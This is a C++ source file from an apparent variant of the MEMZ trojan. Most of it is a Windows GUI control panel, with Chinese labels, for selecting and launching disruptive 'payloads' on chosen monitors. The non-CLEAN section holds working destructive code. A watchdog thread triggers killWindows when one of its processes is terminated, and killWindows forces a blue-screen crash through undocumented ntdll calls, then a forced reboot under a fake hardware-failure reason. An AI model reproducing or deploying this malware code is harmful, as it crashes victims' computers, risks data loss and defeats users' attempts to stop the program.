#include "memz.h"
#include <dwmapi.h>
#include <uxtheme.h>

// Global screen coordinates
int scrx = 0, scry = 0, scrw = 0, scrh = 0;

#ifdef CLEAN
HWND mainWindow;
HFONT fontTitle;
HFONT fontBtn;
HFONT fontSmall;
HWND dialog;
HWND btnStartAll;
HWND comboMonitor;
MONINFO monitors[MAX_MONITORS];
int nMonitors = 0;

int M_ROWS = 0;
int M_WINH = 0;

typedef DPI_AWARENESS_CONTEXT (WINAPI *PFN_SetThreadDpiCtx)(DPI_AWARENESS_CONTEXT);
static PFN_SetThreadDpiCtx pfnSetThreadDpiCtx = NULL;

static int  hoveredBtn    = -1;
static BOOL startAllHover = FALSE;

// ─────────────────────────────────────────────────────────────────────────────
// SetWindowCompositionAttribute (undocumented, for Acrylic blur)
// ─────────────────────────────────────────────────────────────────────────────
enum ACCENT_STATE {
    ACCENT_DISABLED                   = 0,
    ACCENT_ENABLE_GRADIENT            = 1,
    ACCENT_ENABLE_TRANSPARENTGRADIENT = 2,
    ACCENT_ENABLE_BLURBEHIND          = 3,
    ACCENT_ENABLE_ACRYLICBLURBEHIND   = 4,
    ACCENT_INVALID_STATE              = 5
};
struct ACCENTPOLICY {
    ACCENT_STATE AccentState;
    DWORD        AccentFlags;
    DWORD        GradientColor;  // AABBGGRR
    DWORD        AnimationId;
};
enum WINDOWCOMPOSITIONATTRIB { WCA_ACCENT_POLICY = 19 };
struct WINDOWCOMPOSITIONATTRIBDATA {
    WINDOWCOMPOSITIONATTRIB Attrib;
    PVOID                   pvData;
    SIZE_T                  cbData;
};
typedef BOOL (WINAPI *PFN_SWCA)(HWND, WINDOWCOMPOSITIONATTRIBDATA*);
static PFN_SWCA pfnSWCA = NULL;

static void EnableAcrylic(HWND hwnd) {
    if (!pfnSWCA) return;
    // GradientColor: AABBGGRR — 0x99 alpha (60%), very dark navy tint
    // 0x99 = ~60% opaque, color 0x0A0C1E (dark navy) → AABBGGRR = 0x991E0C0A
    ACCENTPOLICY policy = { ACCENT_ENABLE_ACRYLICBLURBEHIND, 0x02, 0x991E0C0A, 0 };
    WINDOWCOMPOSITIONATTRIBDATA data = { WCA_ACCENT_POLICY, &policy, sizeof(policy) };
    pfnSWCA(hwnd, &data);
}

// ─────────────────────────────────────────────────────────────────────────────
// Monitor enumeration
// ─────────────────────────────────────────────────────────────────────────────
BOOL CALLBACK MonitorEnumProc(HMONITOR hMon, HDC, LPRECT, LPARAM) {
    if (nMonitors >= MAX_MONITORS) return FALSE;
    MONITORINFOEX mi; mi.cbSize = sizeof(MONITORINFOEX);
    GetMonitorInfo(hMon, (MONITORINFO*)&mi);
    monitors[nMonitors].rect    = mi.rcMonitor;
    monitors[nMonitors].primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    monitors[nMonitors].index   = nMonitors;
    lstrcpyW(monitors[nMonitors].deviceName, mi.szDevice);
    nMonitors++;
    return TRUE;
}

void refreshMonitorList() {
    nMonitors = 0;
    if (pfnSetThreadDpiCtx) {
        DPI_AWARENESS_CONTEXT prev = pfnSetThreadDpiCtx(DPI_AWARENESS_CONTEXT_UNAWARE);
        EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
        pfnSetThreadDpiCtx(prev);
    } else {
        EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
    }
    for (int i = 1; i < nMonitors; i++) {
        if (monitors[i].primary && !monitors[0].primary) {
            MONINFO tmp = monitors[i];
            for (int j = i; j > 0; j--) monitors[j] = monitors[j-1];
            monitors[0] = tmp;
        }
    }
    for (int i = 0; i < nMonitors; i++) {
        monitors[i].index = i;
        int w = monitors[i].rect.right  - monitors[i].rect.left;
        int h = monitors[i].rect.bottom - monitors[i].rect.top;
        if (monitors[i].primary)
            wsprintfW(monitors[i].name, L"\x5C4F\x5E55 %d (%dx%d) [\x4E3B\x5C4F]", i+1, w, h);
        else
            wsprintfW(monitors[i].name, L"\x5C4F\x5E55 %d (%dx%d)", i+1, w, h);
    }
}

void updateTargetScreen(int idx) {
    if (idx >= 0 && idx < nMonitors) {
        scrx = monitors[idx].rect.left;
        scry = monitors[idx].rect.top;
        scrw = monitors[idx].rect.right  - monitors[idx].rect.left;
        scrh = monitors[idx].rect.bottom - monitors[idx].rect.top;
    } else {
        scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
        scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        idx  = nMonitors;
    }
    setTargetDeviceName(idx);
}

void autoSelectMonitorForWindow(HWND hwnd) {
    HMONITOR hMon = MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST);
    MONITORINFO mi; mi.cbSize = sizeof(MONITORINFO);
    GetMonitorInfo(hMon, &mi);
    for (int i = 0; i < nMonitors; i++) {
        if (monitors[i].rect.left   == mi.rcMonitor.left  &&
            monitors[i].rect.top    == mi.rcMonitor.top   &&
            monitors[i].rect.right  == mi.rcMonitor.right &&
            monitors[i].rect.bottom == mi.rcMonitor.bottom) {
            updateTargetScreen(i);
            if (comboMonitor) SendMessage(comboMonitor, CB_SETCURSEL, i, 0);
            return;
        }
    }
    updateTargetScreen(0);
    if (comboMonitor) SendMessage(comboMonitor, CB_SETCURSEL, 0, 0);
}

int getTargetMonitorIdx() {
    for (int i = 0; i < nMonitors; i++) {
        if (monitors[i].rect.left == scrx && monitors[i].rect.top == scry)
            return i;
    }
    return nMonitors;
}

// ─────────────────────────────────────────────────────────────────────────────
// GDI helpers
// ─────────────────────────────────────────────────────────────────────────────

// Alpha-blend a solid color rect onto hdc
static void AlphaFillRect(HDC dc, RECT r, COLORREF clr, BYTE alpha) {
    int w = r.right-r.left, h = r.bottom-r.top;
    if (w<=0||h<=0) return;
    HDC tmp = CreateCompatibleDC(dc);
    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
    HBITMAP old = (HBITMAP)SelectObject(tmp, bmp);
    HBRUSH br = CreateSolidBrush(clr);
    RECT f={0,0,w,h};
    FillRect(tmp, &f, br);
    DeleteObject(br);
    BLENDFUNCTION bf={AC_SRC_OVER,0,alpha,0};
    AlphaBlend(dc, r.left, r.top, w, h, tmp, 0, 0, w, h, bf);
    SelectObject(tmp, old);
    DeleteObject(bmp);
    DeleteDC(tmp);
}

// Draw rounded rectangle border only
static void DrawRoundBorder(HDC dc, RECT r, int rad, COLORREF clr, int pw=1) {
    HPEN pen = CreatePen(PS_SOLID, pw, clr);
    HPEN op  = (HPEN)SelectObject(dc, pen);
    HBRUSH ob = (HBRUSH)SelectObject(dc, GetStockObject(NULL_BRUSH));
    RoundRect(dc, r.left, r.top, r.right, r.bottom, rad*2, rad*2);
    SelectObject(dc, op); SelectObject(dc, ob);
    DeleteObject(pen);
}

// Fill rounded rectangle with solid color
static void FillRound(HDC dc, RECT r, int rad, COLORREF clr) {
    HPEN pen = CreatePen(PS_NULL, 0, 0);
    HBRUSH br = CreateSolidBrush(clr);
    HPEN op  = (HPEN)SelectObject(dc, pen);
    HBRUSH ob = (HBRUSH)SelectObject(dc, br);
    RoundRect(dc, r.left, r.top, r.right, r.bottom, rad*2, rad*2);
    SelectObject(dc, op); SelectObject(dc, ob);
    DeleteObject(pen); DeleteObject(br);
}

// Alpha-blend rounded rect (glass card)
static void AlphaFillRound(HDC dc, RECT r, int rad, COLORREF clr, BYTE alpha) {
    int w=r.right-r.left, h=r.bottom-r.top;
    if(w<=0||h<=0) return;
    HDC tmp=CreateCompatibleDC(dc);
    HBITMAP bmp=CreateCompatibleBitmap(dc,w,h);
    HBITMAP old=(HBITMAP)SelectObject(tmp,bmp);
    // fill transparent
    RECT f={0,0,w,h};
    FillRect(tmp,&f,(HBRUSH)GetStockObject(BLACK_BRUSH));
    // draw rounded rect on tmp
    HPEN pen=CreatePen(PS_NULL,0,0);
    HBRUSH br=CreateSolidBrush(clr);
    HPEN op=(HPEN)SelectObject(tmp,pen);
    HBRUSH ob=(HBRUSH)SelectObject(tmp,br);
    RoundRect(tmp,0,0,w,h,rad*2,rad*2);
    SelectObject(tmp,op); SelectObject(tmp,ob);
    DeleteObject(pen); DeleteObject(br);
    BLENDFUNCTION bf={AC_SRC_OVER,0,alpha,0};
    AlphaBlend(dc,r.left,r.top,w,h,tmp,0,0,w,h,bf);
    SelectObject(tmp,old);
    DeleteObject(bmp);
    DeleteDC(tmp);
}

// ─────────────────────────────────────────────────────────────────────────────
// CSS-inspired color palette
// rgba(255,255,255,0.03) card bg  → alpha ~8/255
// rgba(255,255,255,0.15) border   → alpha ~38/255
// rgba(255,255,255,0.08) hover    → alpha ~20/255
// rgba(255,255,255,0.12) checked  → alpha ~31/255
// ─────────────────────────────────────────────────────────────────────────────
#define WHITE           RGB(255,255,255)
#define TEXT_WHITE      RGB(255,255,255)
#define TEXT_MUTED      RGB(200,210,230)
#define CARD_ALPHA      8      // rgba(255,255,255,0.03)
#define CARD_HOV_ALPHA  22     // rgba(255,255,255,0.08)
#define CARD_CHK_ALPHA  35     // rgba(255,255,255,0.14) safe checked
#define CARD_UNSAFE_A   35     // rgba(255,255,255,0.14) unsafe checked
#define BORDER_ALPHA    38     // rgba(255,255,255,0.15)
#define BORDER_CHK_A    80     // rgba(255,255,255,0.31) checked border
#define BORDER_UNSAFE_A 80
#define ACCENT_CHK      RGB(100,180,255)  // blue tint border when checked
#define ACCENT_UNSAFE   RGB(255,100,100)  // red tint border when unsafe checked
#define SHIMMER_ALPHA   25     // top shimmer line
#define STARTALL_ALPHA  45     // start-all card alpha
#define SEP_ALPHA       30     // separator line
#define STATUS_ALPHA    15     // status bar bg

// ─────────────────────────────────────────────────────────────────────────────
// Draw one CSS-style glass card button
// ─────────────────────────────────────────────────────────────────────────────
static void DrawGlassCard(HDC dc, RECT r, LPCWSTR text,
                          BOOL checked, BOOL unsafe, BOOL hovered, HFONT fnt)
{
    int rad = 8;  // border-radius: 15px → ~8 in GDI units

    // Card fill (alpha-blended white)
    BYTE bgA = checked ? CARD_CHK_ALPHA : (hovered ? CARD_HOV_ALPHA : CARD_ALPHA);
    AlphaFillRound(dc, r, rad, WHITE, bgA);

    // Border
    COLORREF bc;
    BYTE     ba;
    if (checked && unsafe)       { bc = ACCENT_UNSAFE; ba = BORDER_UNSAFE_A; }
    else if (checked && !unsafe) { bc = ACCENT_CHK;    ba = BORDER_CHK_A;    }
    else                         { bc = WHITE;          ba = BORDER_ALPHA;    }

    // Draw border via alpha-blended 1px outline
    // We approximate by drawing a slightly larger transparent rect then the card
    // Simplest: just draw the round border with a pen at the border color
    // For alpha border, draw on a temp DC and blend
    {
        int w=r.right-r.left, h=r.bottom-r.top;
        HDC tmp=CreateCompatibleDC(dc);
        HBITMAP bmp=CreateCompatibleBitmap(dc,w,h);
        HBITMAP old=(HBITMAP)SelectObject(tmp,bmp);
        RECT f={0,0,w,h};
        FillRect(tmp,&f,(HBRUSH)GetStockObject(BLACK_BRUSH));
        HPEN pen=CreatePen(PS_SOLID,1,bc);
        HPEN op=(HPEN)SelectObject(tmp,pen);
        HBRUSH ob=(HBRUSH)SelectObject(tmp,GetStockObject(NULL_BRUSH));
        RoundRect(tmp,0,0,w,h,rad*2,rad*2);
        SelectObject(tmp,op); SelectObject(tmp,ob);
        DeleteObject(pen);
        BLENDFUNCTION bf={AC_SRC_OVER,0,ba,0};
        AlphaBlend(dc,r.left,r.top,w,h,tmp,0,0,w,h,bf);
        SelectObject(tmp,old);
        DeleteObject(bmp);
        DeleteDC(tmp);
    }

    // Top shimmer line (glass highlight)
    {
        int w=r.right-r.left, h=r.bottom-r.top;
        HDC tmp=CreateCompatibleDC(dc);
        HBITMAP bmp=CreateCompatibleBitmap(dc,w,h);
        HBITMAP old=(HBITMAP)SelectObject(tmp,bmp);
        RECT f={0,0,w,h};
        FillRect(tmp,&f,(HBRUSH)GetStockObject(BLACK_BRUSH));
        HPEN pen=CreatePen(PS_SOLID,1,WHITE);
        HPEN op=(HPEN)SelectObject(tmp,pen);
        MoveToEx(tmp,rad,1,NULL); LineTo(tmp,w-rad,1);
        SelectObject(tmp,op); DeleteObject(pen);
        BLENDFUNCTION bf={AC_SRC_OVER,0,SHIMMER_ALPHA,0};
        AlphaBlend(dc,r.left,r.top,w,h,tmp,0,0,w,h,bf);
        SelectObject(tmp,old);
        DeleteObject(bmp);
        DeleteDC(tmp);
    }

    // Text
    SetBkMode(dc, TRANSPARENT);
    SetTextColor(dc, TEXT_WHITE);
    HFONT of = (HFONT)SelectObject(dc, fnt);
    RECT tr = {r.left+12, r.top, r.right-28, r.bottom};
    DrawTextW(dc, text, -1, &tr, DT_VCENTER|DT_SINGLELINE|DT_LEFT|DT_END_ELLIPSIS);

    // Checkmark ✓
    if (checked) {
        SetTextColor(dc, checked && unsafe ? RGB(255,150,150) : RGB(120,220,150));
        RECT cr = {r.right-26, r.top, r.right-4, r.bottom};
        DrawTextW(dc, L"\x2713", -1, &cr, DT_VCENTER|DT_SINGLELINE|DT_RIGHT);
    }
    SelectObject(dc, of);
}

// ─────────────────────────────────────────────────────────────────────────────
// Full double-buffered paint
// ─────────────────────────────────────────────────────────────────────────────
static void DoPaint(HWND hwnd, HDC destDC)
{
    extern volatile float gAudioLevel;
    extern float gIntensity();

    RECT rc; GetClientRect(hwnd, &rc);
    int W = rc.right, H = rc.bottom;

    HDC     memDC  = CreateCompatibleDC(destDC);
    HBITMAP memBmp = CreateCompatibleBitmap(destDC, W, H);
    HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, memBmp);

    // ── 1. Clear to transparent (black = Acrylic shows through) ──────────
    // We fill with a very dark near-black so the Acrylic blur shows through
    // and text remains readable
    RECT full = {0,0,W,H};
    FillRect(memDC, &full, (HBRUSH)GetStockObject(BLACK_BRUSH));

    // ── 2. Title area subtle overlay ─────────────────────────────────────
    RECT titleRc = {0, 0, W, M_TITLEH};
    AlphaFillRect(memDC, titleRc, WHITE, 10);

    // Title separator
    {
        HDC tmp=CreateCompatibleDC(memDC);
        HBITMAP bmp=CreateCompatibleBitmap(memDC,W,1);
        HBITMAP old=(HBITMAP)SelectObject(tmp,bmp);
        RECT f={0,0,W,1};
        FillRect(tmp,&f,(HBRUSH)CreateSolidBrush(WHITE));
        BLENDFUNCTION bf={AC_SRC_OVER,0,SEP_ALPHA,0};
        AlphaBlend(memDC,0,M_TITLEH-1,W,1,tmp,0,0,W,1,bf);
        SelectObject(tmp,old);
        DeleteObject(bmp);
        DeleteDC(tmp);
    }

    // Title text
    SetBkMode(memDC, TRANSPARENT);
    SetTextColor(memDC, TEXT_WHITE);
    HFONT of = (HFONT)SelectObject(memDC, fontTitle);
    RECT tr = {14, 0, W-10, M_TITLEH};
    DrawTextW(memDC, L"\x7F51\x597D\x5361\x83CC", -1, &tr, DT_VCENTER|DT_SINGLELINE|DT_LEFT);
    SelectObject(memDC, of);

    // Subtitle
    SetTextColor(memDC, TEXT_MUTED);
    HFONT of2 = (HFONT)SelectObject(memDC, fontSmall);
    RECT sr = {148, 0, W-10, M_TITLEH};
    DrawTextW(memDC, L"Made By Nico6719 & Manus",
              -1, &sr, DT_VCENTER|DT_SINGLELINE|DT_LEFT);
    SelectObject(memDC, of2);

    // ── 3. Payload buttons ────────────────────────────────────────────────
    for (int p = 0; p < (int)nPayloads; p++) {
        int col = p%M_COLS, row = p/M_COLS;
        RECT r = {
            col*M_BTNW+(col+1)*M_SP,
            M_TITLEH+row*M_BTNH+(row+1)*M_SP,
            col*M_BTNW+(col+1)*M_SP+M_BTNW,
            M_TITLEH+row*M_BTNH+(row+1)*M_SP+M_BTNH
        };
        BOOL chk = (SendMessage(payloads[p].btn, BM_GETCHECK, 0, 0)==BST_CHECKED);
        DrawGlassCard(memDC, r, payloads[p].name, chk, !payloads[p].safe,
                      (hoveredBtn==p), fontBtn);
    }

    // ── 4. Start All button ───────────────────────────────────────────────
    int btnAreaH = M_ROWS*M_BTNH+(M_ROWS+1)*M_SP;
    int startY   = M_TITLEH+btnAreaH;
    RECT startR  = {M_SP, startY, M_WINW-M_SP, startY+M_STARTALLH};

    BYTE saA = startAllHover ? 55 : STARTALL_ALPHA;
    AlphaFillRound(memDC, startR, 8, WHITE, saA);
    // Border
    {
        int w=startR.right-startR.left, h=startR.bottom-startR.top;
        HDC tmp=CreateCompatibleDC(memDC);
        HBITMAP bmp=CreateCompatibleBitmap(memDC,w,h);
        HBITMAP old=(HBITMAP)SelectObject(tmp,bmp);
        RECT f={0,0,w,h};
        FillRect(tmp,&f,(HBRUSH)GetStockObject(BLACK_BRUSH));
        HPEN pen=CreatePen(PS_SOLID,1,WHITE);
        HPEN op=(HPEN)SelectObject(tmp,pen);
        HBRUSH ob=(HBRUSH)SelectObject(tmp,GetStockObject(NULL_BRUSH));
        RoundRect(tmp,0,0,w,h,16,16);
        SelectObject(tmp,op); SelectObject(tmp,ob); DeleteObject(pen);
        BLENDFUNCTION bf={AC_SRC_OVER,0,BORDER_ALPHA,0};
        AlphaBlend(memDC,startR.left,startR.top,w,h,tmp,0,0,w,h,bf);
        SelectObject(tmp,old); DeleteObject(bmp); DeleteDC(tmp);
    }
    SetBkMode(memDC, TRANSPARENT);
    SetTextColor(memDC, TEXT_WHITE);
    HFONT of3 = (HFONT)SelectObject(memDC, fontBtn);
    DrawTextW(memDC, L"\x2605  \x4E00\x952E\x542F\x52A8\x5168\x90E8\x6548\x679C",
              -1, &startR, DT_CENTER|DT_VCENTER|DT_SINGLELINE);
    SelectObject(memDC, of3);

    // ── 5. Monitor label ──────────────────────────────────────────────────
    int comboSecY = startY+M_STARTALLH+M_SP;
    RECT labelR = {M_SP, comboSecY, M_WINW-M_SP, comboSecY+M_LABELH};
    SetBkMode(memDC, TRANSPARENT);
    SetTextColor(memDC, TEXT_MUTED);
    HFONT of4 = (HFONT)SelectObject(memDC, fontSmall);
    DrawTextW(memDC, L"\x76EE\x6807\x5C4F\x5E55\xFF1A", -1, &labelR, DT_LEFT|DT_VCENTER|DT_SINGLELINE);
    SelectObject(memDC, of4);

    // ── 6. Status bar ─────────────────────────────────────────────────────
    int statusY = H-M_STATUSH;

    // Separator
    {
        HDC tmp=CreateCompatibleDC(memDC);
        HBITMAP bmp=CreateCompatibleBitmap(memDC,W,1);
        HBITMAP old=(HBITMAP)SelectObject(tmp,bmp);
        RECT f={0,0,W,1};
        FillRect(tmp,&f,(HBRUSH)CreateSolidBrush(WHITE));
        BLENDFUNCTION bf={AC_SRC_OVER,0,SEP_ALPHA,0};
        AlphaBlend(memDC,0,statusY,W,1,tmp,0,0,W,1,bf);
        SelectObject(tmp,old); DeleteObject(bmp); DeleteDC(tmp);
    }

    // Status bg
    RECT stR = {0, statusY+1, W, H};
    AlphaFillRect(memDC, stR, WHITE, STATUS_ALPHA);

    // State text
    LPCWSTR stateStr = enablePayloads
        ? L"\x72B6\x6001\xFF1A  \x2705  \x5DF2\x542F\x7528    Shift+O \x5207\x6362"
        : L"\x72B6\x6001\xFF1A  \x274C  \x5DF2\x7981\x7528    Shift+O \x5207\x6362";
    SetBkMode(memDC, TRANSPARENT);
    SetTextColor(memDC, enablePayloads ? RGB(120,230,140) : RGB(255,120,120));
    HFONT of5 = (HFONT)SelectObject(memDC, fontSmall);
    RECT stTxtR = {M_SP, statusY+5, W-M_SP, statusY+20};
    DrawTextW(memDC, stateStr, -1, &stTxtR, DT_LEFT|DT_SINGLELINE);
    SelectObject(memDC, of5);

    // Audio bar track
    RECT barBg = {M_SP, statusY+22, W-M_SP, statusY+33};
    AlphaFillRound(memDC, barBg, 3, WHITE, 15);
    DrawRoundBorder(memDC, barBg, 3, WHITE, 1);

    // Audio bar fill
    int barW = (int)(gAudioLevel*(W-M_SP*2-2));
    if (barW>2) {
        RECT barFg = {M_SP+1, statusY+23, M_SP+1+barW, statusY+32};
        int rv=(int)(gAudioLevel*2*255); if(rv>255)rv=255;
        int gv=(int)((1.0f-gAudioLevel)*2*200); if(gv>200)gv=200;
        FillRound(memDC, barFg, 3, RGB(rv,gv+55,255-rv/2));
    }

    // Audio + intensity label
    WCHAR lvlStr[80];
    wsprintfW(lvlStr, L"\x97F3\x91CF: %d%%    \x5F3A\x5EA6: %d%%",
        (int)(gAudioLevel*100), (int)(gIntensity()*100));
    SetBkMode(memDC, TRANSPARENT);
    SetTextColor(memDC, TEXT_MUTED);
    HFONT of6 = (HFONT)SelectObject(memDC, fontSmall);
    RECT lvlR = {M_SP, statusY+35, W-M_SP, H-4};
    DrawTextW(memDC, lvlStr, -1, &lvlR, DT_LEFT|DT_SINGLELINE|DT_VCENTER);
    SelectObject(memDC, of6);

    // ── Blit ──────────────────────────────────────────────────────────────
    BitBlt(destDC, 0, 0, W, H, memDC, 0, 0, SRCCOPY);
    SelectObject(memDC, oldBmp);
    DeleteObject(memBmp);
    DeleteDC(memDC);
}

// ─────────────────────────────────────────────────────────────────────────────
// WndProc
// ─────────────────────────────────────────────────────────────────────────────
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_ACTIVATE:
        dialog = (wParam==NULL) ? NULL : hwnd;
        break;
    case WM_DESTROY:
        ExitProcess(0);
    case WM_ERASEBKGND:
        return 1;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        DoPaint(hwnd, hdc);
        EndPaint(hwnd, &ps);
        break;
    }
    case WM_TIMER:
        if (wParam==1) InvalidateRect(hwnd, NULL, FALSE);
        break;
    case WM_MOUSEMOVE: {
        int mx=LOWORD(lParam), my=HIWORD(lParam);
        int  nh=-1; BOOL ns=FALSE;
        for (int p=0;p<(int)nPayloads;p++) {
            int col=p%M_COLS, row=p/M_COLS;
            RECT r={col*M_BTNW+(col+1)*M_SP,
                    M_TITLEH+row*M_BTNH+(row+1)*M_SP,
                    col*M_BTNW+(col+1)*M_SP+M_BTNW,
                    M_TITLEH+row*M_BTNH+(row+1)*M_SP+M_BTNH};
            if(mx>=r.left&&mx<r.right&&my>=r.top&&my<r.bottom){nh=p;break;}
        }
        int bah=M_ROWS*M_BTNH+(M_ROWS+1)*M_SP, sy=M_TITLEH+bah;
        if(mx>=M_SP&&mx<M_WINW-M_SP&&my>=sy&&my<sy+M_STARTALLH) ns=TRUE;
        if(nh!=hoveredBtn||ns!=startAllHover){
            hoveredBtn=nh; startAllHover=ns;
            InvalidateRect(hwnd,NULL,FALSE);
        }
        TRACKMOUSEEVENT tme={sizeof(tme),TME_LEAVE,hwnd,0};
        TrackMouseEvent(&tme);
        break;
    }
    case WM_MOUSELEAVE:
        hoveredBtn=-1; startAllHover=FALSE;
        InvalidateRect(hwnd,NULL,FALSE);
        break;
    case WM_LBUTTONDOWN: {
        int mx=LOWORD(lParam), my=HIWORD(lParam);
        for (int p=0;p<(int)nPayloads;p++) {
            int col=p%M_COLS, row=p/M_COLS;
            RECT r={col*M_BTNW+(col+1)*M_SP,
                    M_TITLEH+row*M_BTNH+(row+1)*M_SP,
                    col*M_BTNW+(col+1)*M_SP+M_BTNW,
                    M_TITLEH+row*M_BTNH+(row+1)*M_SP+M_BTNH};
            if(mx>=r.left&&mx<r.right&&my>=r.top&&my<r.bottom){
                BOOL chk=(SendMessage(payloads[p].btn,BM_GETCHECK,0,0)==BST_CHECKED);
                if(!chk&&!payloads[p].safe){
                    if(MessageBoxW(hwnd,
                        L"\x8BE5\x6548\x679C\x88AB\x8BA4\x4E3A\x662F\x534A\x5371\x5BB3\x7684\x3002\r\n"
                        L"\x60A8\x4ECD\x7136\x8981\x542F\x7528\x5B83\x5417\xFF1F",
                        L"\x7F51\x597D\x5361\x83CC",MB_YESNO|MB_ICONWARNING)!=IDYES)
                        break;
                }
                SendMessage(payloads[p].btn,BM_SETCHECK,chk?BST_UNCHECKED:BST_CHECKED,0);
                InvalidateRect(hwnd,NULL,FALSE);
                break;
            }
        }
        int bah2=M_ROWS*M_BTNH+(M_ROWS+1)*M_SP, sy2=M_TITLEH+bah2;
        if(mx>=M_SP&&mx<M_WINW-M_SP&&my>=sy2&&my<sy2+M_STARTALLH){
            for(int p=0;p<(int)nPayloads;p++){
                if(payloads[p].payloadFunction==payloadExecute)  continue;
                if(payloads[p].payloadFunction==payloadKeyboard) continue;
                SendMessage(payloads[p].btn,BM_SETCHECK,BST_CHECKED,0);
            }
            enablePayloads=TRUE;
            InvalidateRect(hwnd,NULL,FALSE);
        }
        break;
    }
    case WM_COMMAND:
        if(LOWORD(wParam)==IDC_COMBO_MONITOR&&HIWORD(wParam)==CBN_SELCHANGE){
            int sel=(int)SendMessage(comboMonitor,CB_GETCURSEL,0,0);
            if(sel!=CB_ERR) updateTargetScreen(sel);
        }
        break;
    case WM_CTLCOLORSTATIC:
    case WM_CTLCOLORBTN: {
        HDC hdc=(HDC)wParam;
        SetBkMode(hdc,TRANSPARENT);
        return (LRESULT)GetStockObject(NULL_BRUSH);
    }
    default:
        return DefWindowProc(hwnd,msg,wParam,lParam);
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Keyboard thread
// ─────────────────────────────────────────────────────────────────────────────
DWORD WINAPI keyboardThread(LPVOID) {
    for(;;){
        if((GetKeyState(VK_SHIFT)&0x8000)&&(GetKeyState('O')&0x8000)){
            enablePayloads=!enablePayloads;
            if(!enablePayloads){
                RedrawWindow(NULL,NULL,NULL,RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
                EnumWindows(&CleanWindowsProc,NULL);
                closeAllPopups();
            }
            InvalidateRect(mainWindow,NULL,FALSE);
            while((GetKeyState(VK_SHIFT)&0x8000)&&(GetKeyState('O')&0x8000)) Sleep(100);
        } else if((GetKeyState(VK_SHIFT)&GetKeyState(VK_DELETE))&0x8000){
            if(enablePayloads){
                for(int p=0;p<(int)nPayloads;p++){
                    if(SendMessage(payloads[p].btn,BM_GETCHECK,0,NULL)==BST_CHECKED)
                        payloads[p].delay=payloads[p].payloadFunction(
                            payloads[p].times,payloads[p].runtime,TRUE);
                }
            }
            while((GetKeyState(VK_SHIFT)&GetKeyState(VK_DELETE))&0x8000) Sleep(100);
        }
        Sleep(50);
    }
}

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM) {
    WCHAR cls[256]={};
    GetClassNameW(hwnd,cls,255);
    if(lstrcmpW(cls,L"MEMZPanel")!=0)
        RedrawWindow(hwnd,NULL,NULL,RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN|RDW_FRAME);
    return TRUE;
}
#endif // CLEAN

// ─────────────────────────────────────────────────────────────────────────────
// Non-CLEAN stubs
// ─────────────────────────────────────────────────────────────────────────────
#ifndef CLEAN
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if(msg==WM_CLOSE||msg==WM_ENDSESSION){killWindows();return 0;}
    return DefWindowProc(hwnd,msg,wParam,lParam);
}
DWORD WINAPI watchdogThread(LPVOID) {
    int oproc=0;
    char *fn=(char*)LocalAlloc(LMEM_ZEROINIT,512);
    GetProcessImageFileNameA(GetCurrentProcess(),fn,512);
    Sleep(1000);
    for(;;){
        HANDLE snapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
        PROCESSENTRY32 proc; proc.dwSize=sizeof(proc);
        Process32First(snapshot,&proc);
        int nproc=0;
        do {
            HANDLE hProc=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,proc.th32ProcessID);
            char *fn2=(char*)LocalAlloc(LMEM_ZEROINIT,512);
            GetProcessImageFileNameA(hProc,fn2,512);
            if(!lstrcmpA(fn,fn2)) nproc++;
            CloseHandle(hProc); LocalFree(fn2);
        } while(Process32Next(snapshot,&proc));
        CloseHandle(snapshot);
        if(nproc<oproc) killWindows();
        oproc=nproc;
        Sleep(10);
    }
}
void killWindows(){
    for(int i=0;i<20;i++){CreateThread(NULL,4096,&ripMessageThread,NULL,NULL,NULL);Sleep(100);}
    killWindowsInstant();
}
void killWindowsInstant(){
    HMODULE ntdll=LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege=GetProcAddress(ntdll,"RtlAdjustPrivilege");
    FARPROC NtRaiseHardError   =GetProcAddress(ntdll,"NtRaiseHardError");
    if(RtlAdjustPrivilege&&NtRaiseHardError){
        BOOLEAN t1; DWORD t2;
        ((void(*)(DWORD,DWORD,BOOLEAN,LPBYTE))RtlAdjustPrivilege)(19,1,0,&t1);
        ((void(*)(DWORD,DWORD,DWORD,DWORD,DWORD,LPDWORD))NtRaiseHardError)(0xc0000022,0,0,0,6,&t2);
    }
    HANDLE token; TOKEN_PRIVILEGES priv;
    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&token);
    LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&priv.Privileges[0].Luid);
    priv.PrivilegeCount=1; priv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token,FALSE,&priv,0,(PTOKEN_PRIVILEGES)NULL,0);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,SHTDN_REASON_MAJOR_HARDWARE|SHTDN_REASON_MINOR_DISK);
}
DWORD WINAPI ripMessageThread(LPVOID){
    HHOOK hook=SetWindowsHookEx(WH_CBT,msgBoxHook,0,GetCurrentThreadId());
    MessageBoxA(NULL,(LPCSTR)msgs[random()%nMsgs],"MEMZ",MB_OK|MB_SYSTEMMODAL|MB_ICONHAND);
    UnhookWindowsHookEx(hook);
    return 0;
}
#endif // !CLEAN

// ─────────────────────────────────────────────────────────────────────────────
// WinMain
// ─────────────────────────────────────────────────────────────────────────────
